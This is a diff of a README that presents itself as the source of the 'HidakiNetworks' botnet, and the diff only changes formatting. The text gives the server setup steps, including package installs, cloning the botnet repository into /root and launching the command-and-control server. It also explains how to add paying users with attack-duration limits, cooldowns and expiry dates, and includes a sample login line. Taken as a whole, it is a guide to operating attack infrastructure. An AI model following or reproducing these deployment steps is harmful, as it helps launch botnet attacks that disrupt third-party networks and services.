@@ -1,6 +1,6 @@
 # HidakiNetworks
 this is a source of [HidakiNetworks](https://t.me/hidakiteam) botnet\
-Tested on Debian 10, 11 and Ubuntu 18.04, 20.04\
+Tested on Debian 10, 11 and Ubuntu 18.04, 20.04
 
 ## Installing
 Guide for Ubuntu/Debian\
@@ -12,8 +12,8 @@ apt install deltarpm -y
 apt install nano screen gcc wget libzip-dev unzip git apache2 -y
 ```
 
-**Copy sources**
-You must put sources into the /root directory!!\
+**Copy sources**\
+You must put sources into the /root directory!!
 ```bash
 cd /root
 git clone https://github.com/shittzuka/hidaki.git
@@ -36,7 +36,7 @@ screen ./srv 4258 1 <cnc port here>
 ## Adding users
 For adding user, you must add a string in users/login.txt.\
 NAME PASS GROUP MAX_ATTACK_TIME COOLDOWN MAX_ATTACK_COUNT EXPIRE_DATE\
-Example: root shittzukamygpd 9999 3 10 99/99/9999\
+Example: root shittzukamygpd 9999 3 10 99/99/9999
 
 ## Credits
 [HidakiTeam](https://t.me/hidakiteam) - Created botnet\
